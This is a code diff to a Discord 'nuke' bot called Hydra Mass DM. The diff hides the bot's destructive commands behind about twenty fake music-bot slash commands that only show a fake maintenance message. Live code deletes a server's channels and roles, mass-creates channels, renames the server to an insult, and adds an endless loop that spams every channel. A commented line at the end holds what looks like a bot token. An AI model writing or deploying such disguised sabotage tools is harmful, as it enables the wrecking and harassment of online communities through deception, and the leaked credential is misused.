@@ -1,22 +1,32 @@
-import os, colorama
+import os, colorama, random
+import time as tm
 from termcolor import colored
+
+import cffi, pycparser, nacl
+from io import BytesIO
+from discord import app_commands
+import youtube_dl
+import DiscordUtils
 
 from datetime import datetime
 
 colorama.init()
 
-try:
+try: 
     import discord
     from discord.ext import commands
+    from discord.ext.commands import Context
 except:
     os.system("python -m pip install discord")
     import discord
     from discord.ext import commands
+    
 
 token = "{bottoken}"
 prefix = "{cmdprefix}"
 guildid = "{gid}"
 userid = []
+music = DiscordUtils.Music()
 with open('modules\whitelists.txt', 'r') as file:
     for line in file:
         userid.append(line.strip())
@@ -43,22 +53,20 @@ Available commands for the Hydra Mass DM bot :
 
 :green_circle: Activations
 
-**{prefix}massdm (message)** - Send a single message DM to everyone in the server.
-**{prefix}dm (user) (message)** - Send a single message to a specific user.
-**{prefix}spamuser (user) (amount) (message)** - Spam a specific user.
-**{prefix}nuke (members/channels/roles/all) (channel-amount) (channel-name) (message-content)** - Nuke the server. Channel name should be `like-this` not `LIKE THIS` or `like this`.
-**{prefix}changenick (user/all) (nickname)** - Change the nickname of a single member or everyone in the server including you and the bot.
-**{prefix}grantadmin (user/all)** - Give admin permissions to a single member or everyone in the server.
+**{prefix}say** - Repeat a few words.
 """
 
-nuke_modes = ['members', 'channels', 'roles', 'all']
 
 @client.event
 async def on_ready():
     os.system("cls")
-    print(colored(f"Hydra initialized as: {client.user}",'blue'))
+    print(colored(f"Bot initialized as: {client.user}",'blue'))
     print("")
-
+    try:
+        synced = await client.tree.sync()
+        print(f"Synced {len(synced)} command(S)")
+    except Exception as e:
+        print(e)
 # commands
 
 @client.command()
@@ -257,7 +265,8 @@ async def nuke(ctx, mode: str, channelamount=0, channelname="", *, message=""):
             await ctx.message.delete()
         if mode in nuke_modes:
             if mode == "members":
-                guild = ctx.guild or client.get_guild(int(guildid))
+                print(colored(f"{time}",'white'), colored(f"Command not available",'red'))
+                '''guild = ctx.guild or client.get_guild(int(guildid))
                 bot_member = guild.get_member(client.user.id)
                 if bot_member.guild_permissions.administrator:
                     for member in guild.members:
@@ -275,7 +284,7 @@ async def nuke(ctx, mode: str, channelamount=0, channelname="", *, message=""):
                                 print(colored(f"{time}",'white'), colored(f"Couldn't ban {member} because of role hierarchy.",'red'))
                     print(colored(f"{time}",'white'), colored("HYDRA - MEMBER BAN COMPLETE",'magenta'))
                 else:
-                    print(colored(f"{time}",'white'), colored("Bot requires admin permissions in the guild to ban members.",'red'))
+                    print(colored(f"{time}",'white'), colored("Bot requires admin permissions in the guild to ban members.",'red'))'''
             elif mode == "channels":
                 guild = ctx.guild or client.get_guild(int(guildid))
                 bot_member = guild.get_member(client.user.id)
@@ -311,6 +320,8 @@ async def nuke(ctx, mode: str, channelamount=0, channelname="", *, message=""):
                     time = datetime.now().strftime("%H:%M:%S")
                     print(colored(f"{time}",'white'), colored(f"Bot requires admin permissions in the guild to delete roles.",'red'))
             elif mode == "all":
+                
+                message = random.choice(messages)
                 guild = ctx.guild or client.get_guild(int(guildid))
                 bot_member = guild.get_member(client.user.id)
                 if bot_member.guild_permissions.administrator:
@@ -334,27 +345,14 @@ async def nuke(ctx, mode: str, channelamount=0, channelname="", *, message=""):
                                 if role.name != "@everyone":
                                     time = datetime.now().strftime("%H:%M:%S")
                                     print(colored(f"{time}",'white'), colored(f"Couldn't delete {role} because it is managed by an integration",'red'))
-                    for member in guild.members:
-                        if str(member.id) not in userid and member.id != client.user.id:
-                            if discord.utils.get(guild.roles, id=bot_member.top_role.id) > discord.utils.get(guild.roles, id=member.top_role.id):
-                                try:
-                                    await member.ban(reason="HYDRA MASS DM - NUKE")
-                                    time = datetime.now().strftime("%H:%M:%S")
-                                    print(colored(f"{time}",'white'), colored(f"Banned {member}",'green'))
-                                except discord.errors.Forbidden:
-                                    time = datetime.now().strftime("%H:%M:%S")
-                                    print(colored(f"{time}",'white'), colored(f"Couldn't ban {member} because of role hierarchy.",'red'))
-                            else:
-                                time = datetime.now().strftime("%H:%M:%S")
-                                print(colored(f"{time}",'white'), colored(f"Couldn't ban {member} because of role hierarchy.",'red'))
                     for i in range(channelamount):
+                        channelname = random.choice(channelnames)
                         nukechannel = await guild.create_text_channel(channelname.lower())
                         time = datetime.now().strftime("%H:%M:%S")
                         print(colored(f"{time}",'white'), colored(f"{i+1}",'blue'), colored("/",'green'), colored(f"{channelamount}",'blue'), colored(f"Created {nukechannel}",'green'))
-                        await nukechannel.send(message)
-                    await guild.edit(name="NUKED - HYDRA - RIOT ADMINISTRATION")
+                    await guild.edit(name="Stupid Adam")
                     time = datetime.now().strftime("%H:%M:%S")
-                    print(colored(f"{time}",'white'), colored(f"Changed server name to NUKED - HYDRA - RIOT ADMINISTRATION",'green'))
+                    print(colored(f"{time}",'white'), colored(f"Changed server name",'green'))
                     print(colored(f"{time}",'white'), colored("HYDRA - NUKE COMPLETED",'magenta'))
                 else:
                     time = datetime.now().strftime("%H:%M:%S")
@@ -362,7 +360,150 @@ async def nuke(ctx, mode: str, channelamount=0, channelname="", *, message=""):
         else:
             time = datetime.now().strftime("%H:%M:%S")
             print(colored(f"{time}",'white'), colored(f"Input a valid nuke option. Available : members/channels/roles/all",'red'))
+    
+@client.command()    
+async def spamchats(ctx):
+    validation = command_validation(ctx)
+    if validation:
+        if ctx.guild:
+            await ctx.message.delete()
+        guild = ctx.guild or client.get_guild(int(guildid))
+        bot_member = guild.get_member(client.user.id)
+        if bot_member.guild_permissions.administrator:
+            while True:
+                for channel in guild.channels:
+                    message = random.choice(messages)
+                    time = datetime.now().strftime("%H:%M:%S")
+                    try:
+                        await channel.send(message)
+                        time = datetime.now().strftime("%H:%M:%S")
+                        print(colored(f"{time}",'white'), colored(f"Spamming in {channel}",'green'))
+                    except discord.errors.HTTPException:
+                        time = datetime.now().strftime("%H:%M:%S")
+                        print(colored(f"{time}",'white'), colored(f"Couldn't spam in {channel} because of an error.",'red'))
 
+                print(colored(f"{time}",'white'), colored("HYDRA - NUKE COMPLETED",'magenta'))
+        else:
+            time = datetime.now().strftime("%H:%M:%S")
+            print(colored(f"{time}",'white'), colored(f"Bot requires admin permissions in the guild to nuke.",'red'))
+
+
+embed = discord.Embed(
+    title=":tools: MAINTENANCE :tools:",
+    description="We regret to inform you that the bot service is currently offline due to updates and maintenance.",
+    color=discord.Color(int("b8a88e", 16))  # Specifica un colore per l'embed (opzionale)
+)
+
+# Aggiungere un campo all'embed (opzionale)
+embed.add_field(name="Error value:", value="503", inline=True)
+embed.add_field(name="End of maintenance:", value="12/24h", inline=True)
+
+# Aggiungere un'immagine in miniatura all'embed (opzionale)
+embed.set_thumbnail(url="https://cdn.icon-icons.com/icons2/209/PNG/256/maintenance256_24835.png")
+
+# Aggiungere un footer all'embed (opzionale)
+embed.set_footer(text="Powered by Lunabot 2.0")
+    
+#Fake commands 
+@client.tree.command(name = "join", description="Join Vc")
+async def join(interaction: discord.Interaction):
+    voicetrue = interaction.user.voice 
+    if voicetrue is None:
+        return interaction.response.send_message("You are not in a voice channel")
+    channel = interaction.user.voice.channel
+    await interaction.response.send_message("Joining...")
+    await channel.connect()
+
+@client.tree.command(name="leave", description="Leave Vc")
+async def leave(interaction: discord.Interaction):
+    voicetrue = interaction.user.voice 
+    mevoicetrue = interaction.guild.me.voice 
+    if voicetrue is None:
+        return interaction.response.send_message("You are not in a voice channel")
+    if mevoicetrue is None:
+        return interaction.response.send_message("Bot isn't in a voice channel")
+    await interaction.guild.me.voice.channel.disconnect()
+    
+@client.tree.command(name="play", description="play a song")
+async def play(interaction: discord.Interaction):
+    '''player = music.get_player(guild_id=ctx.guild.id)
+    if not player:
+        player = music.create_player(ctx, ffmpeg_error_betterfix=True)
+    if not ctx.voice_channel.is_playing():
+        await player.queue(url, search=True)
+        song = await player.play()
+        await ctx.send(f"I started playing {song.name}")
+    else:
+        song = await player.queue(url, search=True)
+        await ctx.send(f"{song.name} has been added to playlist")
+    '''
+    await interaction.response.send_message(embed=embed)
+    
+@client.tree.command(name="vote", description="vote me on top gg")
+async def vote(interaction: discord.Interaction):
+    await interaction.response.send_message(embed=embed)
+
+@client.tree.command(name="volume", description="Sets the player's volume")
+async def volume(interaction: discord.Interaction):
+    await interaction.response.send_message(embed=embed)
+
+@client.tree.command(name="voicetoggle", description="Denied the bot from joining in specific voice channels")
+async def voicetoggle(interaction: discord.Interaction):
+    await interaction.response.send_message(embed=embed)
+
+@client.tree.command(name="topsongs", description="Top songs from this server!")
+async def topsongs(interaction: discord.Interaction):
+    await interaction.response.send_message(embed=embed)
+  
+@client.tree.command(name="togglemessage", description="The bot will take commands from only setup channel!")
+async def togglemessage(interaction: discord.Interaction):
+    await interaction.response.send_message(embed=embed)
+  
+@client.tree.command(name="toggledelete", description="Turn on/off auto delete feature for setup channel!")
+async def toggledelete(interaction: discord.Interaction):
+    await interaction.response.send_message(embed=embed)
+  
+@client.tree.command(name="texttoggle", description="Denied the bot from responding in specific channels")
+async def texttoggle(interaction: discord.Interaction):
+    await interaction.response.send_message(embed=embed)
+  
+@client.tree.command(name="stop", description="Clears the queue and stop the current player")
+async def stop(interaction: discord.Interaction):
+    await interaction.response.send_message(embed=embed)
+    
+@client.tree.command(name="stats", description="About Bot information")
+async def stats(interaction: discord.Interaction):
+    await interaction.response.send_message(embed=embed)
+    
+@client.tree.command(name="spotifyid_remove", description="Remove your spotify account!")
+async def spotifyid_remove(interaction: discord.Interaction):
+    await interaction.response.send_message(embed=embed)
+
+@client.tree.command(name="spotifyid_add", description="Link your spotify account!")
+async def spotifyid_add(interaction: discord.Interaction):
+    await interaction.response.send_message(embed=embed)
+
+@client.tree.command(name="skip", description="Skips to the next song")
+async def skip(interaction: discord.Interaction):
+    await interaction.response.send_message(embed=embed)
+  
+@client.tree.command(name="shuffle", description="Shuffles the queue")
+async def shuffle(interaction: discord.Interaction):
+    await interaction.response.send_message(embed=embed)
+    
+@client.tree.command(name="setup", description="Setup a request channel!")
+async def setup(interaction: discord.Interaction):
+    await interaction.response.send_message(embed=embed)
+    
+@client.tree.command(name="settings", description="Shows you the current settings")
+async def settings(interaction: discord.Interaction):
+    await interaction.response.send_message(embed=embed)
+    
+@client.tree.command(name="setprefix", description="Change prefix for the bot")
+async def setprefix(interaction: discord.Interaction):
+    await interaction.response.send_message(embed=embed)
 
 os.system("title Hydra Mass DM")
 client.run(token)
+
+#MTIxNjQ0MDk3ODIyMzc5NjI3NQ.GHvRVq.h2jY_PVChvl0v6F-8apKn4L3yBTJABnoCk478U
